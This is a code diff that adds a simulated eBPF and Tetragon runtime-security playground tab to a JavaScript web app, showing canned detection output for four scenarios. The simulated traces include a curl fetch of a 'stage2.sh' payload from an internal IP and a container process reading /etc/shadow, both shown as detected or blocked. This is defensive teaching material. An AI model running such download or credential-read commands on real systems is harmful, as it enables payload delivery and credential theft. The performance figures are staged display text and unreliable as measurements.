@@ -906,6 +906,7 @@
     renderKernel("seccomp_bpf");
     renderAgentMCP("ipi_tool_call");
     renderSANSDFIR("prefetch_exec");
+    renderEBPFRuntime("kprobe_exec");
   }
 
   function hidePlayground(){
@@ -916,7 +917,7 @@
   }
 
   function switchPlaygroundTab(tabName){
-    const validTabs = ["canbus", "sqli", "adcs", "jwt", "bgp", "oauth", "dbshield", "edr", "crypto", "dfir", "sbom", "serverless", "cloudir", "extsec", "pqc", "kernel", "agentmcp", "sansdfir"];
+    const validTabs = ["canbus", "sqli", "adcs", "jwt", "bgp", "oauth", "dbshield", "edr", "crypto", "dfir", "sbom", "serverless", "cloudir", "extsec", "pqc", "kernel", "agentmcp", "sansdfir", "ebpfruntime"];
     if (!validTabs.includes(tabName)) tabName = "canbus";
     document.querySelectorAll(".pg-tab").forEach(tab => {
       tab.classList.toggle("active", tab.getAttribute("data-tab") === tabName);
@@ -3629,6 +3630,144 @@
     verdictOut.textContent = verdictText;
   }
 
+  /* ===== 19. eBPF Runtime Security & Tetragon Inspector ===== */
+  let currentEBPFScenario = "kprobe_exec";
+
+  function renderEBPFRuntime(scenario){
+    const targetEl = document.getElementById("ebpfTargetInput");
+    const engineEl = document.getElementById("ebpfEngineSelect");
+    const traceBadge = document.getElementById("ebpfTraceBadge");
+    const verdictBadge = document.getElementById("ebpfVerdictBadge");
+    const traceOut = document.getElementById("ebpfTraceOutput");
+    const verdictOut = document.getElementById("ebpfVerdictOutput");
+
+    if (!targetEl || !engineEl || !traceBadge || !verdictBadge || !traceOut || !verdictOut) return;
+
+    if (scenario){
+      currentEBPFScenario = scenario;
+      if (scenario === "kprobe_exec"){
+        targetEl.value = "kprobe:sys_execve (PID: 4912 / /bin/bash)";
+        engineEl.value = "kprobe";
+      } else if (scenario === "lsm_isolate"){
+        targetEl.value = "bpf_lsm_file_open (/etc/shadow / NS: cgroup2)";
+        engineEl.value = "lsm";
+      } else if (scenario === "tetragon_sigkill"){
+        targetEl.value = "TracingPolicy: commit_creds (PID: 5120 / rootkit_privesc)";
+        engineEl.value = "tetragon";
+      } else if (scenario === "rootkit_carve"){
+        targetEl.value = "sys_enter_getdents64 (Stealth Rootkit Map: 0xffff8880)";
+        engineEl.value = "rootkit";
+      }
+    } else {
+      if (engineEl.value === "kprobe") currentEBPFScenario = "kprobe_exec";
+      else if (engineEl.value === "lsm") currentEBPFScenario = "lsm_isolate";
+      else if (engineEl.value === "tetragon") currentEBPFScenario = "tetragon_sigkill";
+      else if (engineEl.value === "rootkit") currentEBPFScenario = "rootkit_carve";
+    }
+
+    const mode = currentEBPFScenario;
+    let traceText = "";
+    let verdictText = "";
+
+    if (mode === "kprobe_exec"){
+      traceText =
+        "[eBPF Kprobe & Tracepoint Syscall Stream]:\n" +
+        "  Hook: " + targetEl.value + "\n" +
+        "  Probe Type: BPF_PROG_TYPE_KPROBE (Section: kprobe/__x64_sys_execve)\n" +
+        "  Ring Buffer Event Captured (bpf_ringbuf_output):\n" +
+        "    > Timestamp: 2026-10-27T02:35:10.884Z | CPU: 0 | TGID: 4912 | PID: 4912\n" +
+        "    > Comm: \"curl\" | Parent Comm: \"bash\" (PPID: 4890)\n" +
+        "    > Syscall Args: filename=\"/usr/bin/curl\", argv=[\"curl\", \"http://10.0.12.88/stage2.sh\"]\n" +
+        "    > UID: 1001 (devuser) | GID: 1001 | Namespaces: mnt:4026531840, pid:4026531841\n" +
+        "  CO-RE BTF Relocation:\n" +
+        "    ✓ BPF Type Format (BTF) resolved struct task_struct->real_cred without kernel headers\n" +
+        "    ✓ Ring buffer backpressure: 0 drops (high-throughput kernel ringbuf streaming)";
+      verdictText =
+        "[Kernel Runtime Observability Assessment]:\n" +
+        "  - Telemetry Accuracy: 100% full syscall argument capture without userspace auditd drop\n" +
+        "  - Low Overhead: Direct in-kernel ring buffer extraction (< 1.2% CPU overhead)\n" +
+        "  - MITRE ATT&CK: T1059.004 (Unix Shell Execution) & T1105 (Ingress Tool Transfer)\n" +
+        "Verdict: 📡 IN-KERNEL TELEMETRY ACTIVE (Zero-Loss Syscall Execution Streaming)";
+      traceBadge.textContent = "KPROBE: ACTIVE";
+      traceBadge.className = "token-tag token-inj";
+      verdictBadge.textContent = "VERDICT: MONITORED";
+      verdictBadge.className = "token-tag token-lit";
+
+    } else if (mode === "lsm_isolate"){
+      traceText =
+        "[eBPF Linux Security Module (LSM) Enforcement]:\n" +
+        "  Hook: " + targetEl.value + "\n" +
+        "  Probe Type: BPF_PROG_TYPE_LSM (Section: lsm/file_open)\n" +
+        "  Access Request Trapped:\n" +
+        "    > Process: python3 (PID: 5044, Container ID: cgroup:/docker/a1f94e)\n" +
+        "    > Target Path: /etc/shadow (Mode: O_RDONLY)\n" +
+        "    > Namespace Boundary: Container Mount NS (4026532299) -> Host Root FS\n" +
+        "  BPF LSM Return Evaluation:\n" +
+        "    if (is_container_ns(task) && is_sensitive_host_path(file)) return -EPERM;\n" +
+        "    --> In-kernel Return Code: -1 (Operation not permitted: EPERM)";
+      verdictText =
+        "[LSM Zero Trust Sandboxing Assessment]:\n" +
+        "  - Policy: Container breakout and host credential tampering strictly blocked\n" +
+        "  - Defense Mechanism: Synchronous kernel LSM hook execution prior to VFS inode read\n" +
+        "  - MITRE ATT&CK: T1003.008 (/etc/passwd and /etc/shadow Credential Dumping)\n" +
+        "Verdict: 🛡️ ACCESS BLOCKED (-EPERM Enforced by In-Kernel LSM Sandbox)";
+      traceBadge.textContent = "LSM: BLOCKED (-EPERM)";
+      traceBadge.className = "token-tag token-inj";
+      verdictBadge.textContent = "VERDICT: ENFORCED";
+      verdictBadge.className = "token-tag token-lit";
+
+    } else if (mode === "tetragon_sigkill"){
+      traceText =
+        "[Cilium Tetragon TracingPolicy In-Kernel Enforcement]:\n" +
+        "  Sensor: " + targetEl.value + "\n" +
+        "  CRD Policy: tetragon.io/v1alpha1 TracingPolicy\n" +
+        "    spec.kprobes[0].call: \"commit_creds\"\n" +
+        "    spec.kprobes[0].selectors[0].matchArgs[0].index: 0\n" +
+        "    spec.kprobes[0].selectors[0].matchActions[0].action: \"Sigkill\"\n" +
+        "  Kernel Trapping Event:\n" +
+        "    > Exploit: Dirty Cred / PrivEsc exploit attempting kernel credential overwrite\n" +
+        "    > Function Hook: commit_creds(struct cred *new)\n" +
+        "    > Tetragon In-Kernel Action Triggered: bpf_send_signal(SIGKILL)\n" +
+        "    > Process Terminated: PID 5120 instantly killed before returning to userspace";
+      verdictText =
+        "[Tetragon In-Kernel Active Prevention Summary]:\n" +
+        "  - Zero Race Condition: Attack stopped synchronously inside kernel space (no TOCTOU)\n" +
+        "  - Enforcement Action: In-Kernel SIGKILL executed prior to privilege elevation\n" +
+        "  - MITRE ATT&CK: T1068 (Exploitation for Privilege Escalation)\n" +
+        "Verdict: ⚡ IN-KERNEL SIGKILL EXECUTED (Exploit Process Annihilated Before PrivEsc)";
+      traceBadge.textContent = "TETRAGON: SIGKILL";
+      traceBadge.className = "token-tag token-inj";
+      verdictBadge.textContent = "VERDICT: NEUTRALIZED";
+      verdictBadge.className = "token-tag token-lit";
+
+    } else { // rootkit_carve
+      traceText =
+        "[eBPF Shadow Rootkit Hunter & Bytecode Memory Carving]:\n" +
+        "  Target Inspection: " + targetEl.value + "\n" +
+        "  Anomalous Hook Detection (bpftool prog / kallsyms scan):\n" +
+        "    > Syscall Hook: sys_enter_getdents64 (Hooked by hidden BPF program ID: 9481)\n" +
+        "    > Evasion Vector: bpf_probe_write_user tampering with linux_dirent64 entries\n" +
+        "    > Cloaked Artifacts: Directory entries matching \"bpf_shadow_rootkit*\" wiped from buffer\n" +
+        "  Rootkit Eradication & Triage:\n" +
+        "    1. Bytecode dump: bpftool prog dump xlated id 9481 (Recovered malicious helper calls)\n" +
+        "    2. Map enumeration: Unpinned BPF map fd detached from kernel memory\n" +
+        "    3. Link destruction: sys_bpf(BPF_LINK_DETACH) invoked to restore clean dirent stream";
+      verdictText =
+        "[Rootkit Forensic Triage & Remediation]:\n" +
+        "  - Threat: Stealth eBPF rootkit leveraging bpf_probe_write_user to conceal files\n" +
+        "  - Eradication: Malicious BPF link detached and ringbuf telemetry restored\n" +
+        "  - Hardening: Set sysctl kernel.unprivileged_bpf_disabled = 2 and enable BPF lockdown\n" +
+        "Verdict: 🔒 ROOTKIT NEUTRALIZED (Shadow BPF Program Detached, Dirent Stream Restored)";
+      traceBadge.textContent = "ROOTKIT: DETACHED";
+      traceBadge.className = "token-tag token-lit";
+      verdictBadge.textContent = "VERDICT: CLEANSED";
+      verdictBadge.className = "token-tag token-lit";
+    }
+
+    traceOut.textContent = traceText;
+    verdictOut.textContent = verdictText;
+  }
+
   /* ===== export & import ===== */
   function exportJSON(){
     const payload = {
@@ -3920,6 +4059,8 @@
         openPlayground("agentmcp"); break;
       case "sansdfir": case "artifact": case "supertimeline": case "for508": case "for572":
         openPlayground("sansdfir"); break;
+      case "ebpfruntime": case "ebpf": case "tetragon": case "tracingpolicy": case "bpf":
+        openPlayground("ebpfruntime"); break;
       case "search": case "find": case "검색": doSearch(arg); break;
       case "export": case "backup": doExport(arg); break;
       case "import": case "restore": doImport(arg); break;
@@ -4551,6 +4692,22 @@
       sLaser();
       const p = btn.getAttribute("data-dfir-preset");
       renderSANSDFIR(p);
+    });
+  });
+
+  // eBPF Runtime Security & Tetragon Inspector Controls
+  const ebpfRunBtn = document.getElementById("ebpfRunBtn");
+  if (ebpfRunBtn) ebpfRunBtn.addEventListener("click", () => { audio(); sLaser(); renderEBPFRuntime(); });
+  const ebpfTargetInput = document.getElementById("ebpfTargetInput");
+  if (ebpfTargetInput) ebpfTargetInput.addEventListener("input", () => renderEBPFRuntime());
+  const ebpfEngineSelect = document.getElementById("ebpfEngineSelect");
+  if (ebpfEngineSelect) ebpfEngineSelect.addEventListener("change", () => renderEBPFRuntime());
+  document.querySelectorAll("[data-ebpf-preset]").forEach(btn => {
+    btn.addEventListener("click", () => {
+      audio();
+      sLaser();
+      const p = btn.getAttribute("data-ebpf-preset");
+      renderEBPFRuntime(p);
     });
   });
 
